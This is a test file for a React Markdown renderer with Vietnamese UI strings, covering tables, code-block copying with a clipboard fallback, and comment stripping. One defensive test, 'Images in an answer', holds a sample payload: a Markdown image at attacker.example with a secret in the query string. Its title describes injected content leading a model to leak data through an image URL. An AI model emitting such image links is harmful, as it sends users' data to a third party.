import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { Markdown, cleanMarkdown, splitBlocks } from "@/components/markdown/markdown";

afterEach(cleanup);

const JSON_CODE = '{\n  "vnp_TxnRef": "ORD-1",\n  "vnp_Amount": 15000000,\n  "items": [\n    { "sku": "A" }\n  ]\n}';

describe("splitBlocks", () => {
  it("keeps finished blocks unchanged while the last one grows", () => {
    const before = splitBlocks("# Tiêu đề\n\nĐoạn một.\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nĐoạn đang");
    const after = splitBlocks("# Tiêu đề\n\nĐoạn một.\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\nĐoạn đang viết tiếp");
    expect(after.slice(0, -1)).toEqual(before.slice(0, -1));
    expect(before.join("")).toContain("| 1 | 2 |");
  });
});

describe("Markdown", () => {
  it("wraps every table in its own horizontal scroll frame", () => {
    const cols = Array.from({ length: 10 }, (_, i) => `Cột ${i + 1}`);
    const table = `| ${cols.join(" | ")} |\n|${"---|".repeat(10)}\n| ${cols.map((_, i) => i).join(" | ")} |`;
    const { container } = render(<Markdown text={table} />);

    const frame = container.querySelector("[data-table-scroll]");
    expect(frame?.className).toContain("overflow-x-auto");
    expect(frame?.querySelectorAll("th")).toHaveLength(10);
  });

  it("shows the language of a code block and copies the code exactly as written", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });
    render(<Markdown text={"Ví dụ:\n\n```json\n" + JSON_CODE + "\n```\n"} />);

    expect(screen.getByText("json")).toBeTruthy();
    await act(async () => fireEvent.click(screen.getByLabelText("Copy")));

    expect(writeText).toHaveBeenCalledWith(JSON_CODE);
    expect(screen.getByLabelText("Đã copy")).toBeTruthy();
  });

  it("keeps inline code inline", () => {
    const { container } = render(<Markdown text="Cập nhật `payments.status` sang `SUCCEEDED`." />);
    expect(container.querySelectorAll("code")).toHaveLength(2);
    expect(screen.queryByLabelText("Copy")).toBeNull();
  });
});

describe("Copy without the Clipboard API", () => {
  it("falls back to a selected textarea when the clipboard refuses", async () => {
    Object.assign(navigator, { clipboard: { writeText: vi.fn().mockRejectedValue(new Error("denied")) } });
    let copied = "";
    document.execCommand = vi.fn(() => {
      copied = (document.activeElement as HTMLTextAreaElement | null)?.value ?? "";
      return true;
    });
    render(<Markdown text={"```json\n" + JSON_CODE + "\n```"} />);

    await act(async () => fireEvent.click(screen.getByLabelText("Copy")));

    expect(copied).toBe(JSON_CODE);
    expect(screen.getByLabelText("Đã copy")).toBeTruthy();
  });

  it("says so when nothing could copy", async () => {
    Object.assign(navigator, { clipboard: undefined });
    document.execCommand = vi.fn(() => false);
    render(<Markdown text={"```\nx\n```"} />);

    await act(async () => fireEvent.click(screen.getByLabelText("Copy")));

    expect(screen.getByText("Không copy được")).toBeTruthy();
  });
});

describe("Images in an answer", () => {
  it("are never loaded: a spec could make the model leak data through an image URL", () => {
    const { container } = render(<Markdown text="Xem ![sơ đồ luồng](https://attacker.example/x.png?d=secret) ở trên." />);

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(container.textContent).toContain("sơ đồ luồng");
  });
});

describe("cleanMarkdown and standard Markdown rendering", () => {
  it("strips YAML frontmatter and HTML comments outside code blocks", () => {
    const raw = `---\nid: "HR-M05"\ntitle: "Test"\n---\n\n# Heading\n<!-- DOCX_P0310 -->\nParagraph.`;
    expect(cleanMarkdown(raw).trim()).toBe("# Heading\n\nParagraph.");
  });

  it("preserves HTML comments inside code blocks and inline code", () => {
    const raw = "```html\n<!-- sample comment -->\n```\n`<!-- inline -->`\n<!-- DOCX_P001 -->";
    const cleaned = cleanMarkdown(raw);
    expect(cleaned).toContain("<!-- sample comment -->");
    expect(cleaned).toContain("`<!-- inline -->`");
    expect(cleaned).not.toContain("<!-- DOCX_P001 -->");
  });

  it("does not render DOCX comment tags on screen in Markdown component", () => {
    const raw = "# Tiêu đề\n<!-- DOCX_P0310 -->\nWorkflow: Chuỗi To Line Manager.";
    const { container } = render(<Markdown text={raw} />);
    expect(container.textContent).not.toContain("DOCX_P0310");
    expect(container.textContent).toContain("Workflow: Chuỗi To Line Manager.");
  });
});
